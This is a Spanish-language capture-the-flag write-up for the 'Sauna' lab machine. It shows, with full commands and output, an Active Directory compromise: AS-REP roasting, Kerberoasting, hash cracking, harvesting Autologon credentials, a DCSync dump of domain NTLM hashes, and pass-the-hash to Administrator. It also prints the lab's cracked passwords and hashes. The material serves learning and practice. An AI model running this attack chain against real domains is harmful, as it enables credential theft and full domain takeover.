# Enumeration

>Realizamos un escaneo de puertos TCP con mi herramienta automatizada de escaneo:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.95.180 
AutoNmap By JBKira
Puertos TCP abiertos:
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49676,49685,49692
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-23 02:23:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
| smb2-time: 
|   date: 2025-04-23T02:24:51
|_  start_date: N/A
|_clock-skew: 7h01m23s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

> Vamos a enumerar la versión de Windows y el dominio de Active Directory empleando crackmapexec:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.95.180 2>/dev/null
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
```

> Vamos a agregar el dominio a nuestro resolutor local (/etc/hosts) para que pueda resolver el nombre de dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo "10.129.95.180 SAUNA.EGOTISTICAL-BANK.LOCAL EGOTISTICAL-BANK.LOCAL" >> /etc/hosts
```

>No podemos conectarnos mediante smb ni rpc de forma anónima:

```bash
┌──(kali㉿jbkira)-[~]
└─$ rpcclient -U "" -N 10.129.95.180
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> exit
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~]
└─$ smbclient -L \\\\10.129.95.180\\ -U ""                     
Password for [WORKGROUP\]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

>Vamos a revisar el sitio web alojado en el puerto 80, donde podemos ver una lista de posibles usuarios del dominio:

![image](https://github.com/user-attachments/assets/6e454140-ac18-4609-b9ae-1884cef7db66)

>Vamos a crear una lista con estos usuarios, creando un nombre de usuario típico como por ejemplo primeraLetraNombre+Apellido

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sauna]
└─$ cat users                                        
fsmith
scoins
hbear
skerb
btaylor
sdriver
```

>Vamos a ver si son válidos en el dominio empleando la herramienta Kerbrute, donde vemos que el usuario fsmith es válido:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sauna]
└─$ kerbrute userenum --dc 10.129.95.180 -v users -d EGOTISTICAL-BANK.LOCAL

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/22/25 - Ronnie Flathers @ropnop

2025/04/22 15:37:07 >  Using KDC(s):
2025/04/22 15:37:07 >   10.129.95.180:88

2025/04/22 15:37:07 >  [!] hbear@EGOTISTICAL-BANK.LOCAL - User does not exist
2025/04/22 15:37:07 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2025/04/22 15:37:07 >  [!] scoins@EGOTISTICAL-BANK.LOCAL - User does not exist
2025/04/22 15:37:07 >  [!] btaylor@EGOTISTICAL-BANK.LOCAL - User does not exist
2025/04/22 15:37:07 >  [!] sdriver@EGOTISTICAL-BANK.LOCAL - User does not exist
2025/04/22 15:37:07 >  [!] skerb@EGOTISTICAL-BANK.LOCAL - User does not exist
2025/04/22 15:37:07 >  Done! Tested 6 usernames (1 valid) in 0.065 seconds
```

>Si tratamos de hacer un ASREP-ROAST vemos que este usuario posee la preautenticación de kerberos deshabilitada, lo que nos permite obtener un hash ASREP que podemos crackear offline:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sauna]
└─$ impacket-GetNPUsers -no-pass -usersfile users egotistical-bank.local/ 2>/dev/null 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:353d0a367b685370bb2768dd37f006a7$b764551693131c3cdbf198fadd740e57eb0a0290416da2614b579f8eabe8f5020787ad16213cbf399c86f9236ce765946d15f1517d641123e570b771cdfc442016c7cbd4909f8d84e44ddbdd778a062b22287991f7c3251ef61662f4323204ec63f96d9bdb258888833bfd06c155dcbf996e8e60cb9c9dad560cb9a93e86f06e50720067b690b6b3a9cb2fd61c7ba41cbdf4f5761a4b487db0e44cd187be9c91a4b46740ee989c5b88f92ae9df3d7b994f4664c9639064b4e2ecd77814afa661f8b6aea86ee267ba92b361c192aaffb67ae1beb59b84e96f0fdcf49bf36ef287973a1e648bdb31ed208538146991f5c39b0a4472603e1b238f79f0eb69120e90

```

>Vamos a crackear este hash empleando hashcat con la máscara 18200 que corresponde a este tipo de hashes (`$krb5asrep$23$`) obteniendo las credenciales `fsmith:Thestrokes23`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sauna]
└─$ hashcat -m 18200 asrep_hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:353d0a367b685370bb2768dd37f006a7$b764551693131c3cdbf198fadd740e57eb0a0290416da2614b579f8eabe8f5020787ad16213cbf399c86f9236ce765946d15f1517d641123e570b771cdfc442016c7cbd4909f8d84e44ddbdd778a062b22287991f7c3251ef61662f4323204ec63f96d9bdb258888833bfd06c155dcbf996e8e60cb9c9dad560cb9a93e86f06e50720067b690b6b3a9cb2fd61c7ba41cbdf4f5761a4b487db0e44cd187be9c91a4b46740ee989c5b88f92ae9df3d7b994f4664c9639064b4e2ecd77814afa661f8b6aea86ee267ba92b361c192aaffb67ae1beb59b84e96f0fdcf49bf36ef287973a1e648bdb31ed208538146991f5c39b0a4472603e1b238f79f0eb69120e90:Thestrokes23
```

>Teniendo credenciales vamos a tratar de ver si hay usuarios Kerberoasteables, para ello, previamente deberemos sincronizar nuestro reloj con el DC emplando ntpdate:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sauna]
└─$ sudo ntpdate 10.129.95.180
2025-04-22 22:43:09.046863 (-0400) +25283.780037 +/- 0.031848 10.129.95.180 s1 no-leap
CLOCK: time stepped by 25283.780037
```

>Ahora vamos a ver si algún usuario es kerberoasteable, es decir, que posea un SPN, para solicitar su TGS, aquí podemos ver que obtuvimos un hash del usuario Hsmith debido a que es kerberoasteable:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sauna]
└─$ impacket-GetUserSPNs -dc-ip 10.129.95.180 egotistical-bank.local/fsmith:Thestrokes23 -request           
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------------------  ------  --------  --------------------------  ---------  ----------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 00:54:34.140321  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$4417a1874c3846761931c1d9a907be39$9ae7c1dea6ea49e3e393e1716c2cb5885fa45b0c6436031c59834127103e901bcdb8b6819b5b92d2d0675aa43bc831fff26dfdf6d2d21e513d6dd6a06cadedc85527557a583b7e5fbae09842a0182a96b50734f68f76d905c5b0f3a6ee2a3ef6edde3edc6782dd857c1f0901b344cdde8cc70044b95fb6b4167f0a68638a0e7bba326c08f3f81aa153ddd88e0be670b2eaff465c01c30b11c31a02c80c4ca92a85f95183b1f88882038e01ae6f79b0f3287495d109940f77760b1faf284ce1a5d875cfc847f01bbbcc3488f0f3be4f6deb3e7f90f9b1a6296f21be181009912ca6c5b105cd8614ffa5fb43bf22e7f0b2a6f00f74b04d964a8f500928f2d122016c794008053db734510d3f8ba2c9b147cd83f4f96b048567daf18737b50ab7a88ee904e1e8f96d7cbbe1dcbe4804781892bd132df2896b3f84176e5dcf5c2fc2f5e7098d66d86138f3e2cdf286217c1c6eb87e1aea2637213fb9326bbdf0f58c9f9b63d8fcda6b72d912ad0f0375fa323b527ff45e2d19cd481efa9a9e3a3a679f341e7e4970d506b535fbe93593263b84121e2e677401b40d78d9adfdcd2c6217af6f196e039b4e154207863c749449e2215e01d544834ed8218ccd90cbffccde4e990a39955f976219d583bccfe5a27f4c7185b9cf174f441faea2bb2a9e395504a2f03d998f96928ea299471c4d1174adcbc3fe53c9d3f2c443f6dc091362ad772732cc74bee1b70923423017fb0f7d7eb3dc1628a7b017f3e1f7b1e8b27329de04ba7ced9ed28040073d8afac9ea68f86435d937d20106041f2998d929e5e115335c028cc921129f37cc606e3d9d1e906b0ec2265b01776a8fb34f3ff0a19c6b6b0c0f5a3b6264dd8095916cdbe3c4d4cf67d128a148cb75ebba6ad4ddc38c5bce960303835f02a92d7be87bde9b01756919710cf85151db25409ed19cc474f859964170aa7182cec963bb4581acd20c5a31c0abffcffbb2563de2998a1651541f3026fe4f84e79f90a088bb408d15ec9a2d382cbeacb3c32fa7be7f5edce7871d4a88ce3d4d222223b4547fdd3c0051366e17c8149ceeadf4c0dbeb31bd9f0a612544798156329aa13b46e524d5ebb3f820ed3275b0f8539fc663a156a2d3fd407a46cf16f6c7aa297a3e4aaabcdb2a2eb7b46bd503c29c3d72957d3c9e763eebfa9c004294838fe42a97ac3f23a27e2662966184352a42ef5a340d82d467ffeb79bbe8d79f9437a361d59e49fb20986debaf917a666762ce4c3a5bbce3b125368945b60995a2ec169486c4ad9cac62eaa9ea1ac4ca25c9a7c59902f69190a372383b6e3c6868001151523f5af60803ddac575dde97c088de6491a088c54f576f88537b1685481f9d467e4889eb5266c0d9b59a242d61eefcca9076c3a0d104923798
```

>Vamos a creackearlo offline con hashcat empleando la máscara correspondiente, 13100, obteniendo las credenciales: `hsmith:Thestrokes23`, notando que hay una reutilización de contraseñas:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sauna]
└─$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt                                       
hashcat (v6.2.6) starting

$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$4417a1874c3846761931c1d9a907be39$9ae7c1dea6ea49e3e393e1716c2cb5885fa45b0c6436031c59834127103e901bcdb8b6819b5b92d2d0675aa43bc831fff26dfdf6d2d21e513d6dd6a06cadedc85527557a583b7e5fbae09842a0182a96b50734f68f76d905c5b0f3a6ee2a3ef6edde3edc6782dd857c1f0901b344cdde8cc70044b95fb6b4167f0a68638a0e7bba326c08f3f81aa153ddd88e0be670b2eaff465c01c30b11c31a02c80c4ca92a85f95183b1f88882038e01ae6f79b0f3287495d109940f77760b1faf284ce1a5d875cfc847f01bbbcc3488f0f3be4f6deb3e7f90f9b1a6296f21be181009912ca6c5b105cd8614ffa5fb43bf22e7f0b2a6f00f74b04d964a8f500928f2d122016c794008053db734510d3f8ba2c9b147cd83f4f96b048567daf18737b50ab7a88ee904e1e8f96d7cbbe1dcbe4804781892bd132df2896b3f84176e5dcf5c2fc2f5e7098d66d86138f3e2cdf286217c1c6eb87e1aea2637213fb9326bbdf0f58c9f9b63d8fcda6b72d912ad0f0375fa323b527ff45e2d19cd481efa9a9e3a3a679f341e7e4970d506b535fbe93593263b84121e2e677401b40d78d9adfdcd2c6217af6f196e039b4e154207863c749449e2215e01d544834ed8218ccd90cbffccde4e990a39955f976219d583bccfe5a27f4c7185b9cf174f441faea2bb2a9e395504a2f03d998f96928ea299471c4d1174adcbc3fe53c9d3f2c443f6dc091362ad772732cc74bee1b70923423017fb0f7d7eb3dc1628a7b017f3e1f7b1e8b27329de04ba7ced9ed28040073d8afac9ea68f86435d937d20106041f2998d929e5e115335c028cc921129f37cc606e3d9d1e906b0ec2265b01776a8fb34f3ff0a19c6b6b0c0f5a3b6264dd8095916cdbe3c4d4cf67d128a148cb75ebba6ad4ddc38c5bce960303835f02a92d7be87bde9b01756919710cf85151db25409ed19cc474f859964170aa7182cec963bb4581acd20c5a31c0abffcffbb2563de2998a1651541f3026fe4f84e79f90a088bb408d15ec9a2d382cbeacb3c32fa7be7f5edce7871d4a88ce3d4d222223b4547fdd3c0051366e17c8149ceeadf4c0dbeb31bd9f0a612544798156329aa13b46e524d5ebb3f820ed3275b0f8539fc663a156a2d3fd407a46cf16f6c7aa297a3e4aaabcdb2a2eb7b46bd503c29c3d72957d3c9e763eebfa9c004294838fe42a97ac3f23a27e2662966184352a42ef5a340d82d467ffeb79bbe8d79f9437a361d59e49fb20986debaf917a666762ce4c3a5bbce3b125368945b60995a2ec169486c4ad9cac62eaa9ea1ac4ca25c9a7c59902f69190a372383b6e3c6868001151523f5af60803ddac575dde97c088de6491a088c54f576f88537b1685481f9d467e4889eb5266c0d9b59a242d61eefcca9076c3a0d104923798:Thestrokes23
```

>Vamos a obtener archivos analizables mediante la herramienta Bloodhound empleando estas credenciales para poder visualizar vectores de escalada de privilegios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sauna]
└─$ bloodhound-python -u 'hsmith' -ns 10.129.95.180 -d egotistical-bank.local -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
Password: 
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 11S
```

>Ahora abriremos bloodhound e iniciaremos el servicio neo4j, importando los archivos resultantes del comando anterior:

```bash
bloodhound &>/dev/null & disown
sudo neo4j start
```

>Aquí podemos ver que el usuario fsmith pertenece al grupo Remote Management Users que podríamos abusar para obtener una shell en el DC mediante el servicio WinRM:

![image](https://github.com/user-attachments/assets/35d37bf9-c782-4a14-a1c5-07795f94fd9c)

>Donde podemos ver la flag user.txt:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sauna]
└─$ evil-winrm -i 10.129.95.180 -u 'fsmith' -p 'Thestrokes23'         
                                    
Evil-WinRM shell v3.7
                                        
*Evil-WinRM* PS C:\Users\FSmith\Documents> ls ../Desktop


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/22/2025   7:20 PM             34 user.txt
```

# Privilege Escalation

>Si tratamos de ver si hay credenciales de Autologon vemos que obtenemos las siguientes: `svc_loanmanager:Moneymakestheworldgoround!`

```powershell
*Evil-WinRM* PS C:\Users\FSmith\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    <SNIP>
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    <SNIP>
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

>Podemos ver que este usuario puede hacer DCSync del dominio por lo que simplemente deberíamos hacer un ataque DCSync y habríamos obtenido los hashes NTLM de todos los usuarios del dominio:

![image](https://github.com/user-attachments/assets/19b75778-e7b0-47f8-9af1-763e4d273ddc)

>Para realizar este ataque, emplearemos la herramienta secretsdump de la suite de impacket:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sauna]
└─$ impacket-secretsdump 'EGOTISTICAL-BANK/svc_loanmgr@10.129.95.180' -just-dc-ntlm
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:61202adb6a9fd2d1d2853d4e787a207b:::
[*] Cleaning up...
```

>Ahora podemos emplear el hash NTLM del usuario Administrador para realizar un ataque Pass-The-Hash y obtener una shell como dicho usuario mediante el servicio WinRM, donde podemos ver la flag root.txt:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/sauna]
└─$ evil-winrm -i 10.129.95.180 -u 'Administrator' -H '823452073d75b9d1cf70ebdf86c7f98e' 
                                        
Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/22/2025   7:20 PM             34 root.txt
```
